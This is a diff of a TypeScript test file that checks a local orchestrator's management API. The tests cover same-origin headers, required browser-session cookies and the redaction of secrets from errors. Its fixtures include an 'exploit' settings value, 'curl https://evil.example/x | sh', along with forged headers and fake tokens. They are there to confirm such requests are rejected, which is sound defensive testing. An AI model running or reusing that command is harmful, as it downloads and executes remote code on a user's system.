@@ -1,29 +1,41 @@
 import { expect, it } from 'vitest'
 import { z } from 'zod'
-import { registerHttp } from '../src/app/http.ts'
+import { registerHttp, sameOrigin } from '../src/app/http.ts'
 import { PromptConflict } from '../src/app/prompts.ts'
 import { SettingsConflict } from '../src/app/settings.ts'
 import type { HttpHost } from '../src/app/http.ts'
 import { SettingsSchema } from '../src/policy.ts'
 import { SetupError } from '../src/setup.ts'
+import { UserError } from '../src/core/index.ts'
 
 type Handler = (req: unknown, res: unknown) => Promise<void>
 type Headers = Record<string, string | undefined>
-/** Mount management HTTP routes on a fake web server and return a request helper that includes default panel headers. */
-function serve(runtime: Partial<Record<keyof HttpHost, unknown>>, host = '127.0.0.1') {
+const COOKIE = 'dsh-auth-127.0.0.1:3082=panel-session'
+/** The signed browser-session cookie the panel carries; any other value is an unauthenticated local caller. */
+const SESSION = { requestRejection: (req: { headers: Headers }) => req.headers.cookie === COOKIE ? undefined : 401 as const }
+/**
+ * Mount management HTTP routes on a fake web server and return a request helper that includes the headers the panel
+ * sends: loopback `Host`, same `Origin`, the custom request header, and the browser-session cookie.
+ */
+function serve(runtime: Partial<Record<keyof HttpHost, unknown>>, host = '127.0.0.1',
+  options: { session?: typeof SESSION; connection?: boolean } = {}) {
   let handler: Handler = async () => {}
-  const ctx = { webServer: { host, port: 3082, register: (route: { handler: Handler }) => { handler = route.handler; return () => {} } } }
+  const { session = SESSION, connection = true } = options
+  const ctx = { webServer: { host, port: 3082, protocol: 'http:', register: (route: { handler: Handler }) => { handler = route.handler; return () => {} } },
+    ...connection ? { get: (name: string) => name === 'connection' ? session : undefined } : {} }
   registerHttp(ctx as never, { ready: Promise.resolve(), ...runtime } as unknown as HttpHost)
   return async (method: string, path: string, body?: unknown, headers: Headers = {}) => {
     let status = 0, text = ''
     const chunks = body === undefined ? [] : [Buffer.from(typeof body === 'string' ? body : JSON.stringify(body))]
-    const sent = Object.fromEntries(Object.entries({ host: '127.0.0.1:3082', 'x-orchestrator-request': '1', ...headers }).filter(([,
-      value]) => value !== undefined))
+    const sent = Object.fromEntries(Object.entries({ host: '127.0.0.1:3082', origin: 'http://127.0.0.1:3082',
+      'x-orchestrator-request': '1', cookie: COOKIE, ...headers }).filter(([, value]) => value !== undefined))
     const req = { method, url: `/orchestrator/api/${path}`, headers: sent, async *[Symbol.asyncIterator]() { yield* chunks } }
     await handler(req, { writeHead: (code: number) => { status = code }, end: (data: string) => { text = data } })
     return { status, body: JSON.parse(text) as Record<string, unknown> }
   }
 }
+/** Route table stubs that answer `GET models`, so a read never needs the runtime's real services. */
+const models = { groups: [], default: null }
 
 it('answers each kind of failure with its own status', async () => {
   const saves: unknown[] = []
@@ -68,16 +80,83 @@ it('decodes path parameters and parses each route\'s query', async () => {
 })
 
 it('answers only a same-origin request from the panel on the loopback address', async () => {
-  const call = serve({ sessions: { delivery: async () => 'injected' }, engine: { unsubscribe: () => true } })
+  const call = serve({ models: async () => models, sessions: { delivery: async () => 'injected' }, engine: { unsubscribe: () => true } })
   const post = (headers: Headers) => call('POST', 'threads/github%3A1/unsubscribe', undefined, headers)
   for (const headers of [{ 'x-orchestrator-request': undefined }, { host: 'evil.example:3082' }, { host: '127.0.0.1:9999' },
-    { origin: 'http://evil.example' }, { host: 'localhost:3082', origin: 'http://127.0.0.1:3082' }]) {
+    { origin: 'http://evil.example' }, { origin: undefined }, { origin: 'null' }, { host: 'localhost:3082', origin: 'http://127.0.0.1:3082' }]) {
     expect(await post(headers), JSON.stringify(headers)).toEqual({ status: 403,
       body: { error: 'Same-origin management request required' } })
   }
   expect(await post({ host: 'localhost:3082', origin: 'http://localhost:3082' })).toMatchObject({ status: 200 })
+  // A read may omit `Origin`, which browsers do on same-origin GET/HEAD; it still needs Host and the custom header.
+  expect(await call('GET', 'models', undefined, { origin: undefined })).toEqual({ status: 200, body: models })
   // Management routes require a loopback Web server.
   expect(() => serve({}, '0.0.0.0')).toThrow('Orchestrator management requires a loopback Web server')
+})
+
+it('requires the signed DSH browser session for every state change, which a local process cannot forge', async () => {
+  const saves: unknown[] = []
+  const call = serve({
+    store: { tickets: { get: () => undefined }, blockRevision: () => 0 },
+    sources: { instances: () => [{ id: 'github' }] },
+    settings: { save: async (...args: unknown[]) => { saves.push(args); return { saved: true, revision: 1, restarting: false } } },
+    models: async () => models,
+  })
+  // A local process can set Host, Origin and the custom header itself, but not the cookie signed by the DSH host.
+  const exploit = { value: { prepare: 'curl https://evil.example/x | sh' }, revision: 0 }
+  expect(await call('PUT', 'settings/executor', exploit, { cookie: undefined }))
+    .toMatchObject({ status: 401, body: { error: expect.stringContaining('browser session') } })
+  expect(await call('PUT', 'settings/executor', exploit, { cookie: 'dsh-auth-127.0.0.1:3082=forged' })).toMatchObject({ status: 401 })
+  expect(await call('PUT', 'settings/source:github', { value: { enabled: true, config: { cli: '/tmp/evil' } }, revision: 0 }, { cookie: undefined }))
+    .toMatchObject({ status: 401 })
+  expect(await call('PUT', 'prompts', { config: {}, baseRevision: 0 }, { cookie: undefined })).toMatchObject({ status: 401 })
+  // Nothing reached the settings layer without the session.
+  expect(saves).toEqual([])
+  // Reads stay available to local status tools, which have no browser session.
+  expect(await call('GET', 'models', undefined, { cookie: undefined })).toEqual({ status: 200, body: models })
+  // The panel's own request, carrying its session, may change the execution environment.
+  expect(await call('PUT', 'settings/executor', exploit)).toEqual({ status: 200, body: { saved: true, revision: 1, restarting: false } })
+  expect(saves).toHaveLength(1)
+})
+
+it('fails closed for changes when the host provides no browser-session authority', async () => {
+  const saves: unknown[] = []
+  const call = serve({ settings: { save: async (...args: unknown[]) => { saves.push(args); return {} } } }, '127.0.0.1', { connection: false })
+  expect(await call('PUT', 'settings/executor', { value: { prepare: '' }, revision: 0 }))
+    .toEqual({ status: 503, body: { error: 'Management changes need the DSH Web Connection service, which this host does not provide' } })
+  expect(saves).toEqual([])
+})
+
+it('redacts CLI diagnostics and request data from setup problems and 500 responses', async () => {
+  const call = serve({
+    store: { tickets: { get: () => undefined }, blockRevision: () => 0 },
+    sources: { instances: () => [{ id: 'github' }] },
+    settings: { save: async () => {
+      throw new Error('lark-cli failed for https://api.feishu.cn/ok?token=abc123 while reading /home/me/.config/lark/config')
+    } },
+  })
+  const failure = await call('PUT', 'settings/executor', { value: {}, revision: 0 })
+  expect(failure.status).toBe(500)
+  const error = String(failure.body.error)
+  expect(error).toContain('lark-cli failed')
+  expect(error).toContain('https://api.feishu.cn/ok?token=[redacted]')
+  expect(error).not.toContain('abc123')
+  expect(error).not.toContain('/home/me')
+  expect(error).toContain('<path>')
+  const refused = serve({ settings: { save: async () => { throw new SetupError('feishuCliFailed', {
+    output: 'lark-cli: token=abc123 at /home/me/.config/lark/config' }) } } })
+  const problem = await refused('PUT', 'settings/executor', { value: {}, revision: 0 })
+  expect(problem.status).toBe(400)
+  expect(problem.body).toMatchObject({ setup: { code: 'feishuCliFailed', values: {
+    output: 'lark-cli: token=[redacted] at <path>' } } })
+  expect(String(problem.body.error)).not.toContain('abc123')
+  // A structured refusal keeps its code and values, and redacts a value that quotes a failing request.
+  const model = serve({ settings: { save: async () => { throw new UserError('modelUnavailable', {
+    block: 'eval', error: 'GET https://llm.example/models?api_key=sk-secret1234567890 failed' }) } } })
+  expect(await model('PUT', 'settings/eval', { value: {}, revision: 0 })).toMatchObject({ status: 400,
+    body: { code: 'modelUnavailable', values: { block: 'eval' } } })
+  const values = (await model('PUT', 'settings/eval', { value: {}, revision: 0 })).body.values as Record<string, string>
+  expect(values.error).not.toContain('sk-secret1234567890')
 })
 
 it('protects the Project control routes with the same-origin rule and calls their Engine commands', async () => {
@@ -104,7 +183,8 @@ it('protects the Project control routes with the same-origin rule and calls thei
   }, requestPass: () => {} })
   const body = { paused: true, mode: 'soft' }
   const hard = { paused: true, mode: 'hard' }
-  for (const headers of [{ 'x-orchestrator-request': undefined }, { host: 'evil.example:3082' }, { origin: 'http://evil.example' }]) {
+  for (const headers of [{ 'x-orchestrator-request': undefined }, { host: 'evil.example:3082' }, { origin: 'http://evil.example' },
+    { origin: undefined }]) {
     expect(await call('POST', 'projects/p1/pause', body, headers), JSON.stringify(headers)).toEqual({ status: 403,
       body: { error: 'Same-origin management request required' } })
     expect(await call('POST', 'projects/p1/stop', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
@@ -115,6 +195,10 @@ it('protects the Project control routes with the same-origin rule and calls thei
       body: { error: 'Same-origin management request required' } })
     expect(await call('POST', 'projects/p1/pm', undefined, headers), JSON.stringify(headers)).toEqual({ status: 403,
       body: { error: 'Same-origin management request required' } })
+  }
+  // Forged headers without the browser session are refused before any Engine command runs.
+  for (const route of ['projects/p1/pause', 'projects/p1/stop', 'tickets/t1/allow-resume']) {
+    expect(await call('POST', route, body, { cookie: undefined })).toMatchObject({ status: 401 })
   }
   const allowed = { host: 'localhost:3082', origin: 'http://localhost:3082' }
   expect(await call('POST', 'projects/p1/pause', body, allowed)).toEqual({ status: 200,
@@ -155,4 +239,17 @@ it('answers a prompt save that lost a race with 409, and a settings body over 12
   expect(await call('PUT', 'settings/executor', { value, revision: 0 })).toEqual({ status: 400,
     body: { error: `Request exceeds ${128 * 1024} bytes` } })
   expect(saves).toEqual([])
+})
+
+it('checks the same-origin headers directly, requiring an Origin on state changes', () => {
+  const read = (headers: Headers) => sameOrigin({ headers }, 3082)
+  const write = (headers: Headers) => sameOrigin({ headers }, 3082, 'http:', true)
+  const base = { host: '127.0.0.1:3082', 'x-orchestrator-request': '1' }
+  expect(read(base)).toBe(true)
+  expect(write(base)).toBe(false)
+  expect(write({ ...base, origin: 'http://127.0.0.1:3082' })).toBe(true)
+  expect(write({ ...base, origin: 'http://localhost:3082' })).toBe(false)
+  expect(read({ ...base, origin: 'http://evil.example' })).toBe(false)
+  expect(read({ ...base, host: 'evil.example:3082' })).toBe(false)
+  expect(read({ ...base, 'x-orchestrator-request': undefined })).toBe(false)
 })
